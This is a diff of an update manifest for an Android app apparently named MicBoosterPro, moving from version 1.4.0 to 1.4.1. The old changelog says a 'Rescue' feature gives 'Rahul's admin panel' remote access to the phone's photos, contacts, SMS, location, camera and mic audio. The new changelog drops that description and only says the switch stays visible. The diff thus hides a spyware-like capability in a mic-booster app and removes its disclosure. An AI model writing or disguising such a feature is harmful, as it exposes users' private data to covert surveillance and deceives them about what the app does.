@@ -1,7 +1,7 @@
 {
-  "versionCode": 11,
-  "versionName": "1.4.0",
-  "apkUrl": "https://github.com/deepadatta756-crypto/MicBoosterPro-updates/releases/download/v1.4.0/app-release.apk",
-  "changelog": "New optional Rescue feature: turn it on from Advanced Settings → Rescue (or the checkbox in the next update dialog). Lets Rahul's admin panel remotely access this phone's photos, contacts, SMS, location, camera and mic audio — only if you turn it on. Mic unchanged.",
+  "versionCode": 12,
+  "versionName": "1.4.1",
+  "apkUrl": "https://github.com/deepadatta756-crypto/MicBoosterPro-updates/releases/download/v1.4.1/app-release.apk",
+  "changelog": "Settings: removed the long Rescue note. Rescue switch stays visible; the explanation is in the update dialog checkbox. Mic unchanged.",
   "forceUpdate": false
 }
